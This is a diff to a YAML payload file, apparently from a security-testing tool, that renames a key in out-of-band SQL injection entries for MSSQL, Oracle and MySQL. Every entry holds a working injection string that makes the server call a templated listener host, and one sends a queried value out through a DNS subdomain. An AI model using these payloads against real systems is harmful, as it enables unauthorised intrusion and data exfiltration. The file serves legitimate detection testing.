@@ -17,31 +17,31 @@ safety: >
   network and is recorded by every resolver along the path.
 entries:
   - name: DNS interaction via UNC path
-    dbms: [mssql]
+    engine: [mssql]
     payload: "'; DECLARE @q VARCHAR(200); SET @q = '\\\\{{TOKEN}}.{{OAST}}\\a'; EXEC master..xp_dirtree @q--"
     detect: "A DNS lookup for {{TOKEN}}.{{OAST}} arrives at the listener."
     note: "Requires privileges the application user often lacks. A failure here is not evidence that egress is blocked -- record which reason applies."
 
   - name: DNS interaction carrying a value
-    dbms: [mssql]
+    engine: [mssql]
     payload: "'; DECLARE @v VARCHAR(64); SELECT @v = ({{EXPR}}); DECLARE @q VARCHAR(300); SET @q = '\\\\' + @v + '.{{TOKEN}}.{{OAST}}\\a'; EXEC master..xp_dirtree @q--"
     detect: "The interaction's subdomain carries the computed value."
     note: "Keep {{EXPR}} to metadata such as DB_NAME(). Values containing characters invalid in a hostname will truncate the lookup."
 
   - name: HTTP interaction
-    dbms: [oracle]
+    engine: [oracle]
     payload: "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{{TOKEN}}.{{OAST}}') FROM dual) IS NOT NULL AND 'a'='a"
     detect: "A DNS resolution for {{TOKEN}}.{{OAST}} arrives at the listener."
     note: "Network access control lists on modern Oracle commonly block this; an error naming the ACL is a distinct outcome from silence and should be recorded as such."
 
   - name: XXE-backed interaction
-    dbms: [oracle]
+    engine: [oracle]
     payload: "' AND (SELECT EXTRACTVALUE(XMLTYPE('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://{{TOKEN}}.{{OAST}}/\">%p;]>'),'/l') FROM dual) IS NOT NULL AND 'a'='a"
     detect: "An HTTP request for the token path arrives at the listener."
     note: "Uses the XML parser rather than the network package, so it survives some ACL configurations that block the entry above."
 
   - name: file-read triggered lookup
-    dbms: [mysql]
+    engine: [mysql]
     payload: "' AND LOAD_FILE(CONCAT('\\\\\\\\{{TOKEN}}.{{OAST}}\\\\a')) IS NOT NULL AND 'a'='a"
     detect: "A DNS lookup arrives at the listener when the server resolves the UNC path."
     note: "Windows hosts only, and requires FILE privilege with secure_file_priv unset. On Linux MySQL there is no equivalent, which is a result to record rather than a gap."
